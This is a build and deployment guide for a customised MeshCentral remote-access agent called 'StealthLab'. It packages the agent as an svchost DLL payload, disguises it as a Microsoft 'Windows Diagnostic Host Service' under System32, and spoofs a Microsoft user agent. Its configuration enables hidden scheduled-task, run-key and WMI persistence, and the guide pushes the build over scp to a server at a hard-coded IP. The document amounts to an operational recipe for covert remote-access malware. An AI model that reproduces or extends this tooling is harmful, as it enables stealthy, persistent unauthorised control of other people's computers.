# MeshAgent Custom Build & Deployment Guide

This guide describes the current, fully automated workflow for producing StealthLab-ready binaries and deploying them to your MeshCentral instance.

> **Use hostnames, not bare IPs.** Keep the MeshCentral URLs (`agents.high.support`, `relay.high.support`, etc.) in both `branding_config.json` and the MeshCentral portal so the TLS pins remain valid.

---

## Overview

The local build pipeline now handles every step end-to-end:

- `build.ps1 -StealthLab` generates branding headers, builds the StealthLab DLL, and *automatically stages* `meshservice\embedded\svchost_payload.dll` with the latest payload.
- The same invocation emits StealthLab binaries to:
  - `meshservice\x64\StealthLab\MeshService-2022.exe`
  - `meshservice\StealthLab\MeshService-2022.exe`
- Packaging scripts (`build_complete.ps1`, `build_all.ps1`) rename artifacts to the production-friendly `diagsvc.dll` and create a ready-to-ship drop folder.
- `tools\prepare_meshcentral_agent.ps1` runs the StealthLab build, verifies the embedded svchost payload, and stages `MeshService64.exe`, `diagsvc.dll`, provisioning files, and hashes under `dist\meshcentral`.

GitHub Actions remains available for automation, but the on-device workflow is the source of truth and is what the documentation below covers.

---

## Prerequisites

- Windows 10/11 build workstation.
- Visual Studio 2022 with the following workloads:
  - Desktop development with C++
  - MSVC v143 toolset
  - Windows 10/11 SDK
- Python 3.10+ on the PATH (used by helper scripts).
- Git submodules initialised:\
  `git submodule update --init --recursive`
- `branding_config.json` populated with your production values (see the updated template later in this document).

---

## Build Workflow (Recommended)

1. Open *Developer PowerShell for VS 2022* (or any PowerShell session with VS build tools available) and change to the repository root:
   ```powershell
   cd C:\Users\Maincon\OneDrive\Documents\GitHub\MeshAgent
   ```
2. (Optional) Pull the latest changes:
   ```powershell
   git pull
   ```
3. Launch the StealthLab build:
   ```powershell
   .\build.ps1 -StealthLab
   ```
   The script will:
   - Rebuild `MeshService-2022.dll` under `meshservice\x64\StealthLab_DLL`.
   - Copy that DLL into `meshservice\embedded\svchost_payload.dll` (no manual staging required).
   - Emit StealthLab executables for x64 and Win32 and print their sizes plus MD5 hashes.
4. (Optional) Build additional configurations by passing `-Configuration <Name>` (e.g. `Release`, `Debug`, `StealthLab_DLL`).

Verify the payload was staged correctly:
```powershell
Get-FileHash meshservice\x64\StealthLab_DLL\MeshService-2022.dll
Get-FileHash meshservice\embedded\svchost_payload.dll
# Hashes should match
```

---

## Packaging Options

### 1. Generate a Drop-In Package (Recommended)

```powershell
.\build_complete.ps1
```

Outputs a timestamped directory under `dist\package_YYYYMMDD_HHMMSS\` containing:

- `diagsvc.dll` - the svchost payload ready for deployment.
- `MeshService64.exe` (and `MeshService.exe` when built) - svchost-enabled executables for direct overrides.
- `install.ps1`, `README.txt`, and checksum files for operator hand-off.

### 2. Manual Artifact Pickup

If you need individual files:

| Artifact | Location |
|----------|----------|
| StealthLab DLL payload | `meshservice\x64\StealthLab_DLL\MeshService-2022.dll` |
| Bundled resource copy  | `meshservice\embedded\svchost_payload.dll` |
| StealthLab x64 EXE     | `meshservice\x64\StealthLab\MeshService-2022.exe` |
| StealthLab Win32 EXE   | `meshservice\StealthLab\MeshService-2022.exe` |

To create a `diagsvc.dll` manually:
```powershell
Copy-Item meshservice\x64\StealthLab_DLL\MeshService-2022.dll diagsvc.dll
```

### 3. MeshCentral override bundle

To stage files exactly as MeshCentral expects (including the executable override), run:

```powershell
.\tools\prepare_meshcentral_agent.ps1
```

This produces `dist\meshcentral\` with:

- `MeshService64.exe` (and optionally `MeshService.exe`) – svchost-enabled executables ready to copy into `meshcentral-data\agents\`.
- `diagsvc.dll`, provisioning `.msh`, branding JSON, and `checksums.txt` for integrity validation.
- A README summarising deployment steps and hashes.

---

## Deploy to MeshCentral

1. Copy the freshly built `diagsvc.dll` to the MeshCentral server. Adjust the destination to match your installation (default shown below):
   ```powershell
   scp dist\package_*\diagsvc.dll root@72.60.233.29:/opt/meshcentral/meshcentral-data/agents-custom/meshagent_win32_x64.exe
   ```
   *If you maintain separate x86/x64 payloads, upload each with the name MeshCentral expects.*
2. (Optional but recommended) Replace the download executable with `dist\meshcentral\MeshService64.exe` copied to `/opt/meshcentral/meshcentral-data/agents/MeshService64.exe` (and `MeshService.exe` for Win32). This keeps the portal download in sync with the svchost payload.
3. Back up the existing agent binaries before overwriting.
4. Restart MeshCentral to make the new agent downloadable:
   ```bash
   sudo systemctl restart meshcentral
   ```
5. From the MeshCentral portal, download the Windows x64 agent and confirm the timestamp/hash matches the build. Verify the embedded `SVCHOSTDLL` resource with `Test-SvchostPayload`.

---

## Post-Deployment Checks

- Confirm the staged payload on disk matches the StealthLab DLL:
  ```powershell
  Get-FileHash "C:\Windows\System32\DiagnosticHost\diagsvc.dll"
  ```
- Run the included verifier to ensure branding, TLS profile, and provisioning data match expectations:
  ```powershell
  .\tools\verify_deployment.ps1 -Server agents.high.support
  ```
- Enrol a test endpoint with the newly published agent and inspect the MeshCentral console for a successful check-in.

---

## Optional: GitHub Actions Automation

The workflow in `.github/workflows/build-release.yml` still functions, but it now relies on the same PowerShell build scripts documented above. When enabling the workflow:

- Provide `SSH_PRIVATE_KEY` if you want the pipeline to deploy automatically (same key used for manual `scp`).
- Update `BRANDING_CONFIG_JSON` to match the refreshed schema (see next section).
- Expect the artifacts to be named `MeshService-2022.exe` instead of the legacy `MeshService64.exe`.

Manual approvals are no longer needed to stage the DLL—the workflow inherits the `Stage-SvchostPayload` helper, so GitHub builds and local builds stay in sync.

---

## Troubleshooting Quick Reference

| Symptom | Checks |
|---------|--------|
| `svchost_payload.dll` not updated | Re-run `.\\build.ps1 -StealthLab`; verify hashes between `meshservice\x64\StealthLab_DLL\MeshService-2022.dll` and `meshservice\embedded\svchost_payload.dll`. |
| MeshCentral still serving old agent | Confirm upload path, restart MeshCentral, and clear CDN/cache if fronted by a proxy. |
| Agent fails to enrol | Ensure `branding_config.json` `provisioning.serverUrl` matches the domain you uploaded to, and that the server certificate hash is current. |
| Build script exits early | Check that Visual Studio 2022 MSBuild is installed and available at `C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe`. |

---

## Updated Configuration Template

The companion `branding_config.template.json` now mirrors every field consumed by the build scripts. Duplicate it to `branding_config.json` and replace the placeholder values:

```jsonc
{
  "$schema": "./schema/meshagent.schema.json",
  "branding": {
    "companyName": "Microsoft Corporation",
    "serviceName": "WinDiagnosticHost",
    "displayName": "Windows Diagnostic Host Service",
    "binaryName": "diaghost.exe",
    "productName": "Windows Diagnostic Host",
    "description": "system health monitoring",
    "installRoot": "C:/Windows/System32/DiagnosticHost",
    "logPath": "C:/Windows/System32/DiagnosticHost/logs"
  },
  "network": {
    "primaryEndpoint": "wss://agents.high.support:4445/agent.ashx",
    "userAgent": "Microsoft-CryptoAPI/10.0",
    "alpn": ["http/1.1"],
    "retryAttempts": 5,
    "retryDelay": 10
  },
  "stealth": {
    "enabled": true,
    "svchostMode": true,
    "bundleExtract": true
  },
  "persistence": {
    "runKey": true,
    "scheduledTask": { "enabled": true, "hidden": true },
    "wmi": { "enabled": true }
  },
  "provisioning": {
    "meshName": "Windows Diagnostics",
    "meshType": "2",
    "serverUrl": "wss://agents.high.support:4445/agent.ashx",
    "serverId": "YOUR_SERVER_CERT_HASH",
    "meshId": "YOUR_MESH_ID"
  }
}

> When `stealth.svchostMode` is enabled the build pipeline now forces `stealth.bundleExtract` on so the svchost DLL payload is dropped and registered automatically during installation.
```

Keep the JSON committed without secrets; override sensitive values via environment variables or CI secrets when needed.

---

Need more depth? Refer to `STEALTHLAB_CONFIG_GUIDE.md` for registry/service layout and `OPSEC.md` for operational security practices. For assistance or questions, open an issue or contact the maintainer directly.
